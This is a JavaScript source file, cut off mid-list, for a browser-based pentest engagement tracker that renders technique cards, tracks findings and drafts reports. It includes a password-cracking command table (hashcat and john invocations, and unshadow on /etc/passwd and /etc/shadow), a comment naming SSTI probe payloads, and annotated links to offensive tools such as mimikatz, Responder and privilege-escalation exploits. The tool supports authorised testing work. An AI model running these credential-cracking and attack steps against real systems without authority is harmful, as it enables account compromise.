// Obol — Offensive Box Operations Ledger. Client-side only; all state in localStorage.
(function(){
'use strict';

const LS_KEY = 'obol-state-v1';
const CORE_PARAMS = ['target','domain','user','password','hash','lhost','lport','userlist','wordlist'];
const ADV_PARAMS = ['base_dn','hashfile','interface','ports','domain_sid','target_sam','ca_name','template','binary','service','file','group','dc_netbios','dc_account','token','image','osid'];
const PARAMS = CORE_PARAMS.concat(ADV_PARAMS);

const STATES = [
  { id:'start',   name:'Scope defined, nothing known', desc:'You have an IP or subnet and nothing else.', facts:['scope.defined'] },
  { id:'nocred',  name:'Enumerated, no credentials',   desc:'Scans done, services identified, but no creds yet.', facts:['scope.defined','host.alive','scan.initial'] },
  { id:'users',   name:'Usernames, no passwords',      desc:'A validated user list exists.', facts:['scope.defined','host.alive','scan.initial','ad.user_list'] },
  { id:'creds',   name:'Valid credentials',            desc:'At least one working credential.', facts:['scope.defined','host.alive','scan.initial','ad.user_list','credential.available'] },
  { id:'foothold',name:'Foothold (user shell)',        desc:'Code execution as a normal user.', facts:['scope.defined','host.alive','credential.available','foothold.linux','foothold.windows'] },
  { id:'admin',   name:'Admin / root on a host',       desc:'Local admin, root, or SYSTEM on at least one host.', facts:['scope.defined','host.alive','credential.available','access.admin','access.root','access.system'] },
  { id:'domain',  name:'Domain context',               desc:'AD paths mapped or replication rights in reach.', facts:['scope.defined','host.alive','credential.available','ad.dc_candidate','ad.attack_paths'] }
];

const $ = (sel) => document.querySelector(sel);
const esc = (s) => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

// ---------- state ----------
let state;
function load(){
  try { state = JSON.parse(localStorage.getItem(LS_KEY)) || null; } catch(e){ state = null; }
  if (!state) state = { params:{}, boxes:[], progress:{}, facts:['scope.defined'], timerEnd:null };
  state.params = state.params || {}; state.boxes = state.boxes || [];
  state.progress = state.progress || {}; state.facts = state.facts || ['scope.defined'];
  state.ui = state.ui || {};
}
function save(){ localStorage.setItem(LS_KEY, JSON.stringify(state)); }

// ---------- lanes ----------
const LANES = window.OBOL_LANES;
const CARDS = {};
for (const l of LANES) for (const c of l.cards){ c.lane = l.lane; CARDS[c.id] = c; }

function factsSet(extra){ return new Set([...state.facts, ...(extra||[])]); }
function applicable(card, facts){
  const p = card.prereq || {};
  const all = p.all || [], any = p.any || [];
  if (!all.every(f => facts.has(f))) return false;
  if (any.length && !any.some(f => facts.has(f))) return false;
  return true;
}
function renderCmd(run){
  // Only registered placeholders are substituted; anything else (e.g. literal
  // Jinja2 {{7*7}} / {{config}} payloads in SSTI cards) passes through untouched.
  return run.replace(/{{(\w+)}}/g, (m, k) => PARAMS.includes(k) && state.params[k] ? state.params[k] : m);
}

// Command option switches: per-command checkboxes (flags) and text inputs (args)
// that reshape the rendered command. Selections persist per card+command index.
function optsState(cardId, oi){
  state.ui.opts = state.ui.opts || {};
  const k = cardId + ':' + oi;
  state.ui.opts[k] = state.ui.opts[k] || { f:{}, a:{} };
  return state.ui.opts[k];
}
function renderCmdWithOpts(cmd, ost){
  let out = renderCmd(cmd.run);
  (cmd.opts || []).forEach((o, k) => {
    if (o.flag){ if (ost.f && ost.f[k]) out += ' ' + o.flag; }
    else {
      const v = (((ost || {}).a || {})[k] || '').trim();
      if (!v) return;
      const q = '"' + v.replace(/"/g, '\\"') + '"';
      // If the base command already carries this arg with a quoted value, replace it; else append.
      const re = new RegExp(o.arg.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\s+([\'"])[^\'"]*\\1');
      out = re.test(out) ? out.replace(re, o.arg + ' ' + q) : out + ' ' + o.arg + ' ' + q;
    }
  });
  return out;
}
function optsHTML(c, cmd, oi, ost){
  if (!cmd.opts || !cmd.opts.length) return '';
  return '<div class="cmd-opts">' + cmd.opts.map((o, k) => {
    if (o.flag) return '<label class="opt"><input type="checkbox" data-optflag="' + k + '"' + (ost.f && ost.f[k] ? ' checked' : '') + '> <code>' + esc(o.flag) + '</code>' + (o.tip ? '<span class="opt-tip">' + esc(o.tip) + '</span>' : '') + '</label>';
    return '<label class="opt opt-arg-row"><span class="opt-lab">' + esc(o.label || o.arg) + '</span><input class="opt-arg" data-optarg="' + k + '" value="' + esc((ost.a || {})[k] || '') + '" placeholder="' + esc(o.placeholder || '') + '">' + (o.tip ? '<span class="opt-tip">' + esc(o.tip) + '</span>' : '') + '</label>';
  }).join('') + '</div>';
}

// ---------- sidebar ----------
// Example values per parameter — shown as placeholders so users know what good input looks like.
const PARAM_HINTS = {
  target:'10.10.11.5', targets:'10.10.11.0/24 or targets.txt', domain:'corp.local',
  username:'j.smith', password:'Password123', hash:'aad3b435b51404ee…:31d6cfe0d16ae931…',
  dc_ip:'10.10.11.10', lhost:'10.10.14.5', lport:'4444', url:'http://10.10.11.5/login.php',
  wordlist:'/usr/share/wordlists/rockyou.txt', userlist:'/home/kali/labs/users.txt',
  passlist:'/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt',
  base_dn:'DC=corp,DC=local', hashfile:'/home/kali/labs/hashes.txt', interface:'tun0',
  ports:'80,443,8080', domain_sid:'S-1-5-21-…-…-…', target_sam:'svc_backup',
  ca_name:'corp-DC01-CA', template:'User', binary:'C:\\Temp\\winpeas.exe',
  service:'spooler', file:'/home/kali/labs/loot.kdbx', group:'Domain Admins',
  dc_netbios:'DC01', dc_account:'DC01$', token:'eyJhbGciOi…', image:'ubuntu:20.04',
  osid:'OS-12345'
};
function renderSidebar(){
  const el = $('#params');
  const mk = (k) => '<div class="param-row"><label>' + k + '</label>' +
    '<input data-param="' + k + '" value="' + esc(state.params[k] || '') + '" placeholder="' + esc(PARAM_HINTS[k] || ('{{' + k + '}}')) + '"></div>';
  el.innerHTML = CORE_PARAMS.map(mk).join('')
    + '<div class="hint" id="adv-toggle" style="cursor:pointer;color:var(--info)">▸ advanced (' + ADV_PARAMS.length + ')</div>'
    + '<div id="adv-params" style="display:none">' + ADV_PARAMS.map(mk).join('') + '</div>';
  el.querySelectorAll('input').forEach(inp => inp.addEventListener('input', () => {
    state.params[inp.dataset.param] = inp.value; save();
    if (location.hash.startsWith('#/card/') || location.hash.startsWith('#/tools/')) route(); // live re-render of commands
  }));
  $('#adv-toggle').addEventListener('click', () => {
    const p = $('#adv-params');
    const open = p.style.display !== 'none';
    p.style.display = open ? 'none' : 'block';
    $('#adv-toggle').textContent = (open ? '▸' : '▾') + ' advanced (' + ADV_PARAMS.length + ')';
  });
  renderFacts();
}
function renderFacts(){
  $('#facts-list').innerHTML = state.facts.map(f =>
    '<span class="fact" title="click to remove">' + esc(f) + '</span>').join('');
  $('#facts-list').querySelectorAll('.fact').forEach(el => el.addEventListener('click', () => {
    state.facts = state.facts.filter(f => f !== el.textContent); save(); renderFacts(); route();
  }));
}
$('#fact-input').addEventListener('keydown', e => {
  if (e.key !== 'Enter') return;
  const v = e.target.value.trim();
  if (v && !state.facts.includes(v)) state.facts.push(v);
  e.target.value = ''; save(); renderFacts(); route();
});

// ---------- toast + copy nudge ----------
let copyCount = 0;
function toast(msg){
  const t = $('#toast');
  t.textContent = msg; t.classList.remove('hidden');
  clearTimeout(t._h); t._h = setTimeout(() => t.classList.add('hidden'), 4000);
}
function copyWithNudge(b){
  const code = b.parentElement.querySelector('code').textContent;
  navigator.clipboard.writeText(code).then(() => {
    b.textContent = 'Copied ✓'; setTimeout(() => { b.textContent = 'Copy'; }, 900);
    copyCount++;
    if (copyCount <= 4) toast('Copied ✓ — run it, paste the key output into the card\'s evidence box, and mark it tried / succeeded. That feeds your report.');
  });
}

// ---------- progress pill ----------
function renderProgress(){
  const vals = Object.values(state.progress);
  const tried = vals.filter(p => p.status === 'tried').length;
  const done = vals.filter(p => p.status === 'done').length;
  $('#progress').textContent = tried + ' tried · ' + done + ' done';
}

// ---------- onboarding banner ----------
function renderBanner(){
  const b = $('#banner');
  if (state.ui.bannerDismissed){ b.classList.add('hidden'); return; }
  b.classList.remove('hidden');
  b.innerHTML = '<div><b>Quick start:</b> ① fill parameters in the sidebar → ② <a href="#/boxes">Boxes</a> → Ingest nmap scan → ③ applicable cards light up in Map/Lanes → ④ run commands, paste key output into each card\'s evidence box, <b>Mark tried / succeeded</b> (that\'s what builds your report) → ⑤ <a href="#/report">Report</a> assembles the draft. <a href="#/guide">Full guide →</a></div><span id="banner-x" title="dismiss">✕</span>';
  $('#banner-x').onclick = () => { state.ui.bannerDismissed = true; save(); b.classList.add('hidden'); };
}

// ---------- modal ----------
function modal(html){
  $('#modal').innerHTML = html + '<div class="modal-actions"><button class="btn" id="modal-close">Close</button></div>';
  $('#modal-backdrop').classList.remove('hidden');
  $('#modal-close').onclick = closeModal;
}
function closeModal(){ $('#modal-backdrop').classList.add('hidden'); }
$('#modal-backdrop').addEventListener('click', e => { if (e.target.id === 'modal-backdrop') closeModal(); });

// ---------- card rendering ----------
function statusOf(id){ return (state.progress[id] && state.progress[id].status) || 'new'; }

function cardHTML(c, facts, expanded){
  const st = statusOf(c.id);
  const appl = applicable(c, facts);
  const badge = st === 'done' ? '<span class="badge done">done</span>'
    : st === 'tried' ? '<span class="badge tried">tried</span>'
    : appl ? '<span class="badge applicable">applicable</span>' : '<span class="badge new">not yet</span>';
  const sev = c.report && c.report.severity ? '<span class="sev ' + c.report.severity + '">' + c.report.severity + '</span>' : '';
  let html = '<div class="card"><div class="card-head" data-card="' + c.id + '">'
    + badge + ' <span class="title">' + esc(c.title) + '</span> ' + sev + '</div>';
  if (!expanded){ return html + '</div>'; }

  html += '<div class="card-body">'
    + '<p class="hyp">' + esc(c.hypothesis.trim()) + '</p>';
  // Method variants: one technique, several ways to do it — pick one, compare at a glance.
  let cmds = c.commands;
  if (c.variants && c.variants.length){
    const sel = (state.ui.variants && state.ui.variants[c.id]) || c.variants[0].id;
    const cur = c.variants.find(v => v.id === sel) || c.variants[0];
    html += '<div class="variant-pills">' + c.variants.map(v =>
      '<span class="variant-pill' + (v.id === cur.id ? ' active' : '') + '" data-variant="' + esc(v.id) + '" title="' + esc(v.summary) + '">' + esc(v.name) + '</span>').join('')
      + '</div><div class="variant-summary">' + esc(cur.summary) + '</div>';
    cmds = c.commands.filter(cmd => !cmd.v || cmd.v === cur.id);
  }
  for (const cmd of cmds){
    const oi = c.commands.indexOf(cmd);
    const ost = optsState(c.id, oi);
    html += '<div class="cmd-block" data-oid="' + esc(c.id + ':' + oi) + '"><span class="tool"><a href="#/tools/' + encodeURIComponent(cmd.tool) + '" style="color:inherit" title="All ' + esc(cmd.tool) + ' commands">' + esc(cmd.tool) + '</a></span>'
      + '<button class="copy-btn" data-copy>Copy</button><br><code>' + esc(renderCmdWithOpts(cmd, ost)) + '</code>'
      + (cmd.note ? '<div class="note">→ ' + esc(cmd.note) + '</div>' : '')
      + optsHTML(c, cmd, oi, ost) + '</div>';
  }
  if (c.wl && window.OBOL_WORDLISTS){
    const cats = c.wl.map(id => window.OBOL_WORDLISTS.categories.find(x => x.id === id)).filter(Boolean);
    if (cats.length){
      html += '<div class="wl-box"><div class="wl-title">Recommended wordlists (Kali paths, fast → slow)</div>';
      for (const cat of cats){
        for (const w of cat.lists){
          html += '<div class="wl-item"><span class="wl-speed ' + w.speed + '">' + w.speed + '</span> <code>' + esc(w.path) + '</code>'
            + '<div class="note">→ ' + esc(w.fit) + '</div></div>';
        }
      }
      html += '<div class="hint" style="margin-top:6px">' + esc(cats[0].when) + ' — full list: <a href="#/tools/__wordlists" style="color:var(--info)">Tools → Wordlists</a></div></div>';
    }
  }
  if ((c.expected||[]).length)
    html += '<div class="signals">Success looks like: ' + c.expected.map(s => '<code>' + esc(s) + '</code>').join(' ') + '</div>';
  if (c.onFailure && Object.keys(c.onFailure).length){
    html += '<div class="signals">If it fails:</div>';
    for (const [pat, fb] of Object.entries(c.onFailure)){
      html += '<div class="failure"><span class="pat">' + esc(pat) + '</span> — ' + esc(fb.note)
        + (fb.card && CARDS[fb.card] ? ' <span class="lnk" data-goto="' + fb.card + '">→ ' + esc(CARDS[fb.card].title) + '</span>' : '') + '</div>';
    }
  }
  if (c.defender) html += '<div class="defender"><b>Defender’s view:</b> ' + esc(c.defender) + '</div>';
  if ((c.refs||[]).length)
    html += '<div class="refs">Further reading: ' + c.refs.map(r => '<a href="' + esc(r) + '" target="_blank" rel="noopener">' + esc(r) + '</a>').join(' · ') + '</div>';

  const ev = (state.progress[c.id] && state.progress[c.id].evidence) || '';
  html += '<div class="card-actions">'
    + '<button class="btn tried-btn" data-mark="tried">Mark tried</button>'
    + '<button class="btn done-btn" data-mark="done">Mark succeeded</button>'
    + (st !== 'new' ? '<button class="btn" data-mark="new">Reset</button>' : '')
    + '</div>'
    + '<textarea class="evidence" placeholder="Paste key output here — it feeds your report evidence.">' + esc(ev) + '</textarea>';
  return html + '</div></div>';
}

function bindCards(root){
  root.querySelectorAll('.card-head').forEach(h => h.addEventListener('click', e => {
    if (e.target.closest('.copy-btn')) return;
    location.hash = '#/card/' + h.dataset.card;
  }));
  root.querySelectorAll('[data-copy]').forEach(b => b.addEventListener('click', e => {
    e.stopPropagation();
    copyWithNudge(b);
  }));
  root.querySelectorAll('[data-goto]').forEach(l => l.addEventListener('click', () => location.hash = '#/card/' + l.dataset.goto));
  root.querySelectorAll('.variant-pill').forEach(p => p.addEventListener('click', e => {
    e.stopPropagation();
    const id = p.closest('.card').querySelector('.card-head').dataset.card;
    state.ui.variants = state.ui.variants || {};
    state.ui.variants[id] = p.dataset.variant;
    save();
    route();
  }));
  root.querySelectorAll('[data-mark]').forEach(b => b.addEventListener('click', () => {
    const id = b.closest('.card').querySelector('.card-head').dataset.card;
    const mark = b.dataset.mark;
    if (mark === 'new') delete state.progress[id];
    else {
      state.progress[id] = state.progress[id] || {};
      state.progress[id].status = mark;
      state.progress[id].at = new Date().toISOString();
      if (mark === 'done'){
        for (const f of (CARDS[id].produces || [])) if (!state.facts.includes(f)) state.facts.push(f);
        renderFacts();
      }
    }
    save(); renderProgress(); route();
  }));
  root.querySelectorAll('.cmd-opts input').forEach(inp => inp.addEventListener('input', () => {
    const block = inp.closest('.cmd-block');
    const cardId = block.closest('.card').querySelector('.card-head').dataset.card;
    const oi = +block.dataset.oid.split(':').pop();
    const c = CARDS[cardId];
    const cmd = c.commands[oi];
    const ost = optsState(cardId, oi);
    block.querySelectorAll('.cmd-opts input').forEach(x => {
      if (x.dataset.optflag !== undefined){ if (x.checked) ost.f[x.dataset.optflag] = true; else delete ost.f[x.dataset.optflag]; }
      else ost.a[x.dataset.optarg] = x.value;
    });
    save();
    block.querySelector('code').textContent = renderCmdWithOpts(cmd, ost);
  }));
  root.querySelectorAll('.evidence').forEach(t => t.addEventListener('input', () => {
    const id = t.closest('.card').querySelector('.card-head').dataset.card;
    state.progress[id] = state.progress[id] || {};
    state.progress[id].evidence = t.value;
    save();
  }));
}

// ---------- views ----------
function viewMap(){
  const facts = factsSet();
  let html = '<h2>Methodology Map</h2><p class="subtitle">Two ways to navigate: the engagement lifecycle (below — click a phase to open its lanes), or your evidence state (further down — cards applicable from where you actually are).</p>'
    + '<div class="phase-ribbon">'
    + lanePhases().map((ph, i) => {
        const firstLane = LANES.find(l => l.phase === ph).lane;
        return '<span class="phase-chip" data-lane="' + firstLane + '">' + (i+1) + ' · ' + esc(ph) + '</span>';
      }).join('<span class="phase-arrow">→</span>')
    + '</div>'
    + '<h3 style="margin:22px 0 12px;color:var(--dim)">…or jump straight from your current position:</h3><div class="states">';
  for (const s of STATES){
    const sf = factsSet(s.facts);
    const appl = LANES.flatMap(l => l.cards).filter(c => applicable(c, sf));
    html += '<div class="state-card" data-state="' + s.id + '"><h4>' + esc(s.name) + '</h4><p>' + esc(s.desc) + '</p>'
      + '<div class="count">' + appl.length + ' applicable cards</div></div>';
  }
  html += '</div>';
  $('#view').innerHTML = html;
  $('#view').querySelectorAll('.state-card').forEach(el => el.addEventListener('click', () => location.hash = '#/state/' + el.dataset.state));
  $('#view').querySelectorAll('.phase-chip').forEach(el => el.addEventListener('click', () => location.hash = '#/lanes/' + el.dataset.lane));
}

function viewState(sid){
  const s = STATES.find(x => x.id === sid) || STATES[0];
  const sf = factsSet(s.facts);
  const appl = LANES.flatMap(l => l.cards.map(c => ({...c, laneTitle: l.title}))).filter(c => applicable(c, sf));
  let html = '<h2>' + esc(s.name) + '</h2><p class="subtitle">' + esc(s.desc) + ' — ' + appl.length + ' cards apply. Sorted: report severity first.</p>';
  const ord = { critical:0, high:1, medium:2, low:3, informational:4 };
  appl.sort((a,b) => (ord[(a.report||{}).severity] ?? 9) - (ord[(b.report||{}).severity] ?? 9));
  html += '<p class="hint">Lanes: ' + [...new Set(appl.map(c => c.laneTitle))].join(' · ') + '</p><br>';
  html += '<div class="cards-grid">';
  for (const c of appl) html += cardHTML(c, sf, false);
  html += '</div>';
  $('#view').innerHTML = html || '<p class="empty">No applicable cards.</p>';
  bindCards($('#view'));
}

const PHASE_ORDER = ['Recon & Scanning','Initial Access & Web','Credential Attacks','Active Directory','Privesc & Post-Exploitation','Lateral Movement & Pivoting','Shells & Tooling','Data Services','Objectives & Reporting'];
function lanePhases(){
  const present = [...new Set(LANES.map(l => l.phase))];
  return PHASE_ORDER.filter(p => present.includes(p)).concat(present.filter(p => !PHASE_ORDER.includes(p)));
}

function viewLanes(laneId){
  const q = (location.hash.match(/[?&]q=([^&]+)/) || [])[1] || '';
  let tabs = '<span class="lane-tab' + (!laneId ? ' active' : '') + '" data-lane="">All</span>';
  lanePhases().forEach((ph, i) => {
    tabs += '<span class="phase-label">' + (i+1) + ' · ' + esc(ph) + '</span>';
    for (const l of LANES.filter(x => x.phase === ph))
      tabs += '<span class="lane-tab' + (l.lane === laneId ? ' active' : '') + '" data-lane="' + l.lane + '">' + esc(l.title) + '</span>';
  });
  let html = '<h2>Lanes</h2><p class="subtitle">' + LANES.length + ' lanes, ' + Object.keys(CARDS).length + ' technique cards, grouped by engagement phase. Click a card to expand commands.</p>'
    + '<input class="search" id="lane-search" placeholder="Search cards, tools, concepts…" value="' + esc(decodeURIComponent(q)) + '">'
    + '<div class="lane-tabs">' + tabs + '</div><div id="lane-cards" class="cards-grid"></div>';
  $('#view').innerHTML = html;
  const draw = () => {
    const query = $('#lane-search').value.toLowerCase();
    const facts = factsSet();
    let cards = LANES.flatMap(l => l.cards);
    if (laneId) cards = cards.filter(c => c.lane === laneId);
    if (query) cards = cards.filter(c => (c.title + ' ' + c.hypothesis + ' ' + (c.tools||[]).join(' ') + ' ' + c.commands.map(x=>x.run).join(' ')).toLowerCase().includes(query));
    $('#lane-cards').innerHTML = cards.map(c => cardHTML(c, facts, false)).join('') || '<p class="empty">No matching cards.</p>';
    bindCards($('#lane-cards'));
  };
  $('#lane-search').addEventListener('input', draw);
  $('#view').querySelectorAll('.lane-tab').forEach(t => t.addEventListener('click', () => location.hash = '#/lanes' + (t.dataset.lane ? '/' + t.dataset.lane : '')));
  draw();
}

function viewCard(id){
  const c = CARDS[id];
  if (!c){ $('#view').innerHTML = '<p class="empty">Unknown card.</p>'; return; }
  const facts = factsSet();
  $('#view').innerHTML = '<p><a href="#/lanes/' + c.lane + '" style="color:var(--info)">← ' + esc(c.lane) + ' lane</a></p><br>' + cardHTML(c, facts, true);
  bindCards($('#view'));
}

function viewStuck(){
  const facts = factsSet();
  const appl = LANES.flatMap(l => l.cards).filter(c => applicable(c, facts) && statusOf(c.id) !== 'done');
  const failed = Object.entries(state.progress).filter(([,p]) => p.status === 'tried').map(([id]) => CARDS[id]).filter(Boolean);
  let html = '<h2>Stuck?</h2><p class="subtitle">Cards your current facts make applicable but not yet succeeded — plus next-step branches from things you tried.</p>';
  if (failed.length){
    html += '<h3 style="color:var(--accent2);margin-bottom:8px">From things you tried</h3>';
    for (const c of failed){
      if (!c.onFailure) continue;
      for (const [pat, fb] of Object.entries(c.onFailure)){
        html += '<div class="failure"><b>' + esc(c.title) + '</b> — <span class="pat">' + esc(pat) + '</span>: ' + esc(fb.note)
          + (fb.card && CARDS[fb.card] ? ' <span class="lnk" data-goto="' + fb.card + '">→ ' + esc(CARDS[fb.card].title) + '</span>' : '') + '</div>';
      }
    }
    html += '<br>';
  }
  html += '<h3 style="color:var(--accent2);margin-bottom:8px">Applicable right now (' + appl.length + ')</h3>';
  html += '<p class="hint">Facts drive this list. Add facts in the sidebar as you learn things (e.g. <code>foothold.linux</code>, <code>credential.available</code>).</p><br>';
  html += '<div class="cards-grid">';
  for (const c of appl) html += cardHTML(c, facts, false);
  html += '</div>';
  $('#view').innerHTML = html || '<p class="empty">Nothing applicable — add facts or go enumerate more.</p>';
  bindCards($('#view'));
}

const HASH_HELPERS = [
  { file:'KeePass vault (.kdbx)', conv:'keepass2john {{file}} > hash', crack:'hashcat -m 13400 hash {{wordlist}}', note:'Keyfile-protected vaults need the .key file too.' },
  { file:'Encrypted .zip', conv:'zip2john {{file}} > hash', crack:'john --wordlist={{wordlist}} hash  (or hashcat -m 13600 for WinZip AES)', note:'Check encryption type: zipinfo -v shows AES vs ZipCrypto.' },
  { file:'Encrypted .rar', conv:'rar2john {{file}} > hash', crack:'john --wordlist={{wordlist}} hash  (hashcat -m 12500 RAR3 / -m 13000 RAR5)', note:'' },
  { file:'Encrypted .7z', conv:'7z2john {{file}} > hash', crack:'hashcat -m 11600 hash {{wordlist}}', note:'7z hashes are huge — that is normal.' },
  { file:'SSH private key (id_rsa)', conv:'ssh2john.py {{file}} > hash', crack:'john --wordlist={{wordlist}} hash  (JOHN ONLY — hashcat cannot)', note:'Unencrypted keys need no cracking: chmod 600 and use directly.' },
  { file:'PKCS#12 bundle (.pfx/.p12)', conv:'pfx2john.py {{file}} > hash', crack:'john --wordlist={{wordlist}} hash', note:'After cracking: openssl pkcs12 -in file.pfx -out cert.pem -nodes to extract.' },
  { file:'MS Office docs (.docx/.xlsx)', conv:'office2john {{file}} > hash', crack:'hashcat -m 9600 (older) / -m 9700/9800 (newer) or john', note:'' },
  { file:'PDF', conv:'pdf2john {{file}} > hash', crack:'john --wordlist={{wordlist}} hash  (hashcat -m 10400-10700 by version)', note:'' },
  { file:'Linux shadow', conv:'unshadow /etc/passwd /etc/shadow > hash', crack:'hashcat -m 1800 (sha512crypt) / john', note:'unshadow merges passwd+shadow into crackable lines.' },
  { file:'Kerberos TGS (kerberoast)', conv:'(already crackable — $krb5tgs$23$)', crack:'hashcat -m 13100 hash {{wordlist}}', note:'' },
  { file:'AS-REP hash', conv:'(already crackable)', crack:'hashcat -m 18200 hash {{wordlist}}', note:'' },
  { file:'NetNTLMv2 (responder)', conv:'(already crackable)', crack:'hashcat -m 5600 hash {{wordlist}}', note:'' },
  { file:'NTLM (SAM/NTDS.dit)', conv:'(already crackable)', crack:'hashcat -m 1000 hash {{wordlist}}', note:'' },
];

function wordlistArmoryHTML(){
  let h = '<h3 style="color:var(--accent2);margin-bottom:6px">Wordlist Armory</h3>'
    + '<p class="subtitle">Kali default locations, ordered fast → slow, with fit notes. Cards that need a wordlist show the matching category inline.</p>';
  for (const cat of window.OBOL_WORDLISTS.categories){
    h += '<div class="card"><div class="card-head" style="cursor:default"><span class="title">' + esc(cat.name) + '</span></div><div class="card-body">'
      + '<p class="hyp">' + esc(cat.when) + '</p>';
    for (const w of cat.lists){
      h += '<div class="cmd-block"><span class="tool">' + esc(w.name) + '</span> <span class="wl-speed ' + w.speed + '">' + w.speed + '</span>'
        + '<button class="copy-btn" data-copy>Copy path</button><br><code>' + esc(w.path) + '</code>'
        + '<div class="note">→ ' + esc(w.fit) + '</div></div>';
    }
    h += '</div></div>';
  }
  return h;
}

// ---------- tool repos & reference sites ----------
const TOOL_REPOS = [
  ['Recon & Scanning', [
    ['nmap','https://github.com/nmap/nmap','The scanner. NSE scripts live in /usr/share/nmap/scripts.'],
    ['masscan','https://github.com/robertdavidgraham/masscan','Fastest port scanner; rate-limit or you melt things.'],
    ['rustscan','https://github.com/RustScan/RustScan','Fast scan wrapper that pipes into nmap -sV.'],
    ['gobuster','https://github.com/OJ/gobuster','Dir/vhost/DNS brute force.'],
    ['ffuf','https://github.com/ffuf/ffuf','The fast web fuzzer — params, vhosts, dirs, APIs.'],
    ['feroxbuster','https://github.com/epi052/feroxbuster','Rust recursive content discovery.'],
    ['dnsrecon','https://github.com/darkoperator/dnsrecon','DNS enum + zone transfer attempts.'],
    ['theHarvester','https://github.com/laramies/theHarvester','OSINT emails/subdomains from public sources.'],
    ['nikto','https://github.com/sullo/nikto','Web server misconfig scanner.'],
    ['wpscan','https://github.com/wpscanteam/wpscan','WordPress scanner (API token unlocks vuln DB).'],
    ['onesixtyone','https://github.com/trailofbits/onesixtyone','Fast SNMP community brute force.'],
    ['ike-scan','https://github.com/royhills/ike-scan','IPSec VPN discovery + PSK hash grab.'],
    ['searchsploit / exploitdb','https://gitlab.com/exploit-database/exploitdb','Local copy of Exploit-DB at /usr/share/exploitdb.']
  ]],
  ['Web', [
    ['sqlmap','https://github.com/sqlmapproject/sqlmap','SQLi automation; -r <burp-request> is the pro move.'],
    ['PayloadsAllTheThings','https://github.com/swisskyrepo/PayloadsAllTheThings','Payload cheat sheets for every web vuln class.'],
    ['Burp Suite','https://portswigger.net/burp/communitydownload','The web proxy (not on GitHub; ships with Kali).'],
    ['ZAP','https://github.com/zaproxy/zaproxy','Free Burp alternative.'],
    ['git-dumper / GitTools','https://github.com/internetwache/GitTools','Exposed .git → full repo.'],
    ['ysoserial','https://github.com/frohoff/ysoserial','Java deserialization payload generator.']
  ]],
  ['Credential Attacks', [
    ['hashcat','https://github.com/hashcat/hashcat','GPU cracking. Rules in /usr/share/hashcat/rules.'],
    ['john','https://github.com/openwall/john','CPU cracking + the *2john converters (ssh2john, zip2john...).'],
    ['hydra','https://github.com/vanhauser-thc/thc-hydra','Online brute force, every protocol.'],
    ['medusa','https://github.com/jmk-foofus/medusa','hydra alternative.'],
    ['cewl','https://github.com/digininja/CeWL','Target-specific wordlists from websites.'],
    ['hashID','https://github.com/psypanda/hashID','Hash format identification.'],
    ['kerbrute','https://github.com/ropnop/kerbrute','AD username enum + spray over Kerberos (no lockout events on some setups).'],
    ['Responder','https://github.com/lgandx/Responder','LLMNR/NBT-NS/mDNS poisoning → NetNTLM hashes.'],
    ['mitm6','https://github.com/dirkjanm/mitm6','DHCPv6 poisoning → WPAD → auth coercion.'],
    ['PCredz','https://github.com/lgandx/PCredz','Credentials out of pcaps or live traffic.']
  ]],
  ['Active Directory', [
    ['impacket','https://github.com/fortra/impacket','The AD swiss army knife: secretsdump, psexec, GetUserSPNs, GetNPUsers, wmiexec...'],
    ['netexec (nxc)','https://github.com/netexec-community/nxc','CrackMapExec successor — spray, dump, spider, modules.'],
    ['BloodHound CE','https://github.com/SpecterOps/BloodHound','AD attack-path graph.'],
    ['bloodhound-python','https://github.com/dirkjanm/BloodHound.py','Linux-side collector.'],
    ['SharpHound','https://github.com/SpecterOps/SharpHound','Windows-side collector (exe or in-memory PS).'],
    ['PowerView (PowerSploit)','https://github.com/PowerShellMafia/PowerSploit','PowerShell AD enum: Get-NetUser, Find-LocalAdminAccess, ACL abuse.'],
    ['Rubeus','https://github.com/GhostPack/Rubeus','Kerberos abuse from Windows: roast, harvest, pass tickets.'],
    ['mimikatz','https://github.com/gentilkiwi/mimikatz','Credential extraction + PtH/PtT/DCSync/golden tickets.'],
    ['Certipy','https://github.com/ly4k/Certipy','ADCS abuse from Linux (ESC1-ESC8).'],
    ['Certify','https://github.com/GhostPack/Certify','ADCS abuse from Windows.'],
    ['bloodyAD','https://github.com/CravateRouge/bloodyAD','ACL/delegation abuse over LDAP.'],
    ['targetedKerberoast','https://github.com/ShutdownRepo/targetedKerberoast','Kerberoast specific users by setting an SPN when you have GenericWrite.'],
    ['pywhisker','https://github.com/ShutdownRepo/pywhisker','Shadow credentials (msDS-KeyCredentialLink) from Linux.'],
    ['Snaffler','https://github.com/SnaffCon/Snaffler','Find creds in domain shares.'],
    ['MANSPIDER','https://github.com/blacklanternsecurity/MANSPIDER','Spider shares for file content patterns.'],
    ['o365spray','https://github.com/0xZDH/o365spray','O365 user enum + password spray.'],
    ['SharpSCCM','https://github.com/Mayyhem/SharpSCCM','SCCM abuse.']
  ]],
  ['Privesc & Looting', [
    ['PEASS-ng (linpeas/winpeas)','https://github.com/peass-ng/PEASS-ng','Automated privesc enumeration, both OSes.'],
    ['LinEnum','https://github.com/rebootuser/LinEnum','The older Linux enum script — still handy.'],
    ['pspy','https://github.com/DominicBreuker/pspy','Watch processes/cron without root.'],
    ['wesng','https://github.com/bitsadmin/wesng','Windows Exploit Suggester: systeminfo → missing patches → exploits.'],
    ['GodPotato','https://github.com/BeichenDream/GodPotato','SeImpersonate → SYSTEM (modern Windows, DCOM-based, no CLSID hunting).'],
    ['PrintSpoofer','https://github.com/itm4n/PrintSpoofer','SeImpersonate → SYSTEM via named-pipe spoofing (Win10/2019).'],
    ['RoguePotato','https://github.com/antonioCoco/RoguePotato','SeImpersonate → SYSTEM when PrintSpoofer fails; needs port 135 reachable.'],
    ['JuicyPotato','https://github.com/ohpe/juicy-potato','The classic potato for Win7/2008–2012; needs a valid CLSID per build.'],
    ['SweetPotato','https://github.com/CCob/SweetPotato','Potato bundle (PrintSpoofer+Juicy+Rogue) as a single C# payload.'],
    ['PrintNightmare (cube0x0)','https://github.com/cube0x0/CVE-2021-1675','CVE-2021-34527 python PoC + required impacket fork.'],
    ['SharpPrintNightmare','https://github.com/calebstewart/CVE-2021-1675','C# PrintNightmare for Windows-side LPE.'],
    ['gMSADumper','https://github.com/micahvandeusen/gMSADumper','Read gMSA passwords when permitted.']
  ]],
  ['Pivoting', [
